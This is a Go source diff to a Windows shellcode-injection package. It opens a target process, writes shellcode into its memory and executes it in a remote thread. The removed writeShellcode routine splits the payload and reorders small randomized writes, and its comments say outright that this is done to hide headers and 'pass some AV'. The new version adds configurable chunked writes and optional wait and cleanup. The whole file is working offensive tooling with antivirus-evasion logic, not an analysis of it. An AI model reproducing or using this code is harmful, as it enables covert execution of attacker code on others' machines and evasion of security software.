@@ -4,7 +4,6 @@ package injector
 
 import (
 	"context"
-	"sync"
 	"time"
 
 	"github.com/pkg/errors"
@@ -13,15 +12,16 @@ import (
 	"project/internal/module/windows/api"
 	"project/internal/random"
 	"project/internal/security"
-	"project/internal/xpanic"
 )
 
 // InjectShellcode is used to inject shellcode to a process, it will block until execute finish.
+// chunkSize is the shellcode size that will be write by call WriteProcessMemory once.
 // [Warning]: shellcode slice will be covered.
-func InjectShellcode(pid uint32, shellcode []byte) error {
+func InjectShellcode(pid uint32, shellcode []byte, chunkSize int, wait, clean bool) error {
 	defer security.CoverBytes(shellcode)
 	// ------------------------------------create remote thread------------------------------------
 	// open target process
+	doneOP := security.SwitchThreadAsync()
 	const da = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
 		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
 	pHandle, err := api.OpenProcess(da, false, pid)
@@ -57,13 +57,24 @@ func InjectShellcode(pid uint32, shellcode []byte) error {
 	}()
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
-	security.WaitSwitchThreadAsync(ctx, doneVA, doneCRT)
+	security.WaitSwitchThreadAsync(ctx, doneOP, doneVA, doneCRT)
 	// --------------------------------------write shellcode---------------------------------------
-	err = writeShellcode(pHandle, shellcode, memAddr, size)
+	if chunkSize < 1 {
+		chunkSize = 4
+	}
+	mw := memWriter{
+		pHandle:   pHandle,
+		memAddr:   memAddr,
+		memory:    shellcode,
+		size:      size,
+		chunkSize: chunkSize,
+	}
+	err = mw.Write()
 	if err != nil {
 		return err
 	}
-	// ----------------------------------------wait thread-----------------------------------------
+	security.CoverBytes(shellcode)
+	// -------------------------------------execute shellcode--------------------------------------
 	security.SwitchThread()
 	_, err = windows.ResumeThread(tHandle)
 	if err != nil {
@@ -72,140 +83,27 @@ func InjectShellcode(pid uint32, shellcode []byte) error {
 	// close process handle at once and reopen after execute finish
 	api.CloseHandle(pHandle)
 	processHandleClosed = true
-	// wait thread for wait shellcode execute finish
-	security.SwitchThread()
-	_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
-	if err != nil {
-		return errors.Wrap(err, "failed to wait thread")
+	if wait { // wait thread for wait shellcode execute finish
+		security.SwitchThread()
+		_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
+		if err != nil {
+			return errors.Wrap(err, "failed to wait thread")
+		}
 	}
 	// close thread handle at once
 	api.CloseHandle(tHandle)
 	threadHandleClosed = true
-	return cleanShellcode(pid, memAddr, size)
-}
-
-func writeShellcode(pHandle windows.Handle, shellcode []byte, memAddr uintptr, size uintptr) error {
-	// set read write
-	doneVP := security.SwitchThreadAsync()
-	oldProtect := new(uint32)
-	err := api.VirtualProtectEx(pHandle, memAddr, size, windows.PAGE_READWRITE, oldProtect)
-	if err != nil {
-		return err
+	// clean shellcode
+	if wait && clean {
+		return cleanShellcode(pid, memAddr, size)
 	}
-	// write shellcode with multi goroutine
-	const title = "writeShellcode"
-	doneWPM := security.SwitchThreadAsync()
-	rand := random.NewRand()
-	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
-	defer cancel()
-	type item struct {
-		b    []byte
-		addr uintptr
-	}
-	shellcodeCh := make(chan *item, 16)
-	wg := sync.WaitGroup{}
-	// start a shellcode sender
-	wg.Add(1)
-	go func() {
-		defer wg.Done()
-		defer func() {
-			if r := recover(); r != nil {
-				xpanic.Log(r, title)
-			}
-		}()
-
-		splitSize := len(shellcode) / 2
-
-		// secondStage first copy for hide special header
-		firstStage := shellcode[:splitSize]
-		secondStage := shellcode[splitSize:]
-
-		// first size must one byte for pass some AV
-		nextSize := 1
-		for i := 0; i < len(secondStage); {
-			if i+nextSize > len(secondStage) {
-				nextSize = len(secondStage) - i
-			}
-			item := &item{
-				b:    secondStage[i : i+nextSize],
-				addr: memAddr + uintptr(splitSize+i),
-			}
-			select {
-			case shellcodeCh <- item:
-			case <-ctx.Done():
-				return
-			}
-
-			i += nextSize
-			nextSize = 1 + rand.Int(32)
-		}
-
-		// first stage
-		nextSize = 1
-		for i := 0; i < len(firstStage); {
-			if i+nextSize > len(firstStage) {
-				nextSize = len(firstStage) - i
-			}
-			item := &item{
-				b:    firstStage[i : i+nextSize],
-				addr: memAddr + uintptr(i),
-			}
-			select {
-			case shellcodeCh <- item:
-			case <-ctx.Done():
-				return
-			}
-			i += nextSize
-			nextSize = 1 + rand.Int(32)
-		}
-
-		close(shellcodeCh)
-	}()
-	// shellcode writer
-	writer := func() {
-		defer wg.Done()
-		defer func() {
-			if r := recover(); r != nil {
-				xpanic.Log(r, title)
-			}
-		}()
-		for {
-			select {
-			case item := <-shellcodeCh:
-				if item == nil {
-					return
-				}
-				_, err := api.WriteProcessMemory(pHandle, item.addr, item.b)
-				if err != nil {
-					cancel()
-					return
-				}
-				security.CoverBytes(item.b)
-			case <-ctx.Done():
-				return
-			}
-		}
-	}
-	// start 16 shellcode writer
-	for i := 0; i < 16; i++ {
-		wg.Add(1)
-		go writer()
-	}
-	wg.Wait()
-	// set shellcode page execute
-	doneVP2 := security.SwitchThreadAsync()
-	err = api.VirtualProtectEx(pHandle, memAddr, size, windows.PAGE_EXECUTE, oldProtect)
-	if err != nil {
-		return err
-	}
-	// wait thread switch
-	security.WaitSwitchThreadAsync(ctx, doneVP, doneWPM, doneVP2)
 	return nil
 }
 
 // cleanShellcode is used to clean shellcode and free allocated memory.
 func cleanShellcode(pid uint32, memAddr uintptr, size uintptr) error {
 	// reopen target process, maybe failed like process is terminated
+	doneOP := security.SwitchThreadAsync()
 	const da = windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION |
 		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
 	pHandle, err := api.OpenProcess(da, false, pid)
@@ -215,8 +113,8 @@ func cleanShellcode(pid uint32, memAddr uintptr, size uintptr) error {
 	defer api.CloseHandle(pHandle)
 	// clean shellcode and free it
 	doneVP := security.SwitchThreadAsync()
-	oldProtect := new(uint32)
-	err = api.VirtualProtectEx(pHandle, memAddr, size, windows.PAGE_READWRITE, oldProtect)
+	old := new(uint32)
+	err = api.VirtualProtectEx(pHandle, memAddr, size, windows.PAGE_READWRITE, old)
 	if err != nil {
 		return err
 	}
@@ -235,6 +133,6 @@ func cleanShellcode(pid uint32, memAddr uintptr, size uintptr) error {
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
-	security.WaitSwitchThreadAsync(ctx, doneVP, doneWPM, doneVF)
+	security.WaitSwitchThreadAsync(ctx, doneOP, doneVP, doneWPM, doneVF)
 	return nil
 }
